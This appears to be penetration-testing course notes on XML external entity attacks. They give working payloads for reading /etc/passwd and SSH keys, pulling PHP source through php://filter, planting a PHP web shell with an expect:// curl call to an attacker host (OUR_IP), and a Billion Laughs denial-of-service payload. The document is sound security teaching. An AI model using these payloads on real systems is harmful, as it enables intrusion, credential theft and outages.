# Local File Disclosure

When a web application accepts and parses XML input without sanitisation, you can define external XML entities that point to local files on the server. If any element value from that XML gets reflected back in the HTTP response, the file contents will be printed to the page. This is the core mechanism behind XXE-based local file disclosure.

***

## Identifying XXE Entry Points

The first step is finding web pages that accept XML user input, such as contact forms, search forms, or any feature that submits structured data. Intercept the HTTP request using [Burp Suite](https://portswigger.net/burp) to inspect whether the data is being sent in XML format. If the application is using outdated XML libraries with no input filtering, it becomes a viable XXE target.

Once you have identified a form, note which element values are reflected back in the HTTP response. You need at least one reflected element to act as your output channel.

### Testing for Entity Injection

Before going straight to file reads, confirm that the parser is actually processing entity definitions by injecting a harmless internal entity:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Replace the reflected element's value with `&company;` in the request. If the response shows `Inlane Freight` instead of the literal string `&company;`, the application is vulnerable. A non-vulnerable application would print `&company;` as raw text.

> Note: If the XML request has no existing `DOCTYPE`, add the full block above before the root element. If a `DOCTYPE` already exists, insert only the `ENTITY` line inside it.

> Note: Some applications send JSON by default but still accept XML. Try switching the `Content-Type` header to `application/xml` and converting the JSON payload using a tool like [JSON to XML Converter](https://www.convertjson.com/json-to-xml.htm). If the server accepts it, test for XXE as normal.

***

## Reading Sensitive Files

Once entity injection is confirmed, swap the internal entity value for an external file reference using the `SYSTEM` keyword and the `file://` URI scheme:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Reference `&company;` in the reflected element and send the request. If the contents of `/etc/passwd` appear in the response, the file disclosure is successful. From here you can target other sensitive files such as configuration files containing passwords, or SSH private keys at paths like `/home/user/.ssh/id_rsa`.

> Tip: In some Java web applications, pointing the entity at a directory path instead of a file will return a directory listing, which helps locate sensitive files.

***

## Reading Source Code

Directly referencing PHP source files with `file://` often fails because PHP code contains XML special characters like `<`, `>`, and `&` that break the external entity reference. Binary files are also unreadable this way.

To work around this, use [PHP's](https://www.php.net/manual/en/wrappers.php.php) `php://filter/` wrapper to base64-encode the file contents before they are inserted into the XML. The base64 output contains no characters that can break XML structure:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Send the request and you will receive a base64-encoded string in the response. In [Burp Suite](https://portswigger.net/burp), select the string and open the Inspector panel on the right to decode it instantly. This technique only works against PHP applications. The `php://filter` approach is covered in more depth in the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) module.

***

## Remote Code Execution via XXE

XXE can be escalated to remote code execution in certain conditions. The options below go from simplest to most reliable:

- Look for SSH private keys and use them to authenticate directly to the server
- On Windows targets, attempt a hash-stealing attack by making the server connect back to a listener
- On PHP applications with the [expect](https://www.php.net/manual/en/book.expect.php) module installed, use `expect://` to run commands directly, for example `expect://id`

The most reliable RCE method is to fetch a web shell from your own machine and write it to the target server. Follow these steps:

1. Write a basic PHP web shell and host it with Python's HTTP server:

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

2. Use the `expect://` wrapper with a `curl` command to download the shell to the target. Replace spaces with `$IFS` to avoid breaking XML syntax:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

3. Once the server fetches `shell.php`, interact with it to execute commands.

> Note: The `expect` module is not installed or enabled by default on modern PHP servers, so this method is not always available. XXE is most reliably used for file and source code disclosure, which can then reveal further attack paths.

> Note: Avoid using `|`, `>`, and `{` in your `expect://` commands, as these characters can break the XML structure.

***

## SSRF via XXE

XXE can be used to perform Server-Side Request Forgery (SSRF), which lets you enumerate internally open ports and access restricted internal web pages. The [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks) module covers SSRF in depth, and those same techniques apply directly to XXE-based SSRF exploitation.

***

## Denial of Service via Entity Expansion

XXE can also trigger a DoS condition against the hosting server using a [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack) style payload. The attack works by defining a chain of entities where each one references the previous ten times, causing exponential memory consumption when the parser tries to resolve the final entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Modern web servers such as [Apache](https://httpd.apache.org/) include protections against recursive entity self-references, so this payload will not work against hardened targets.
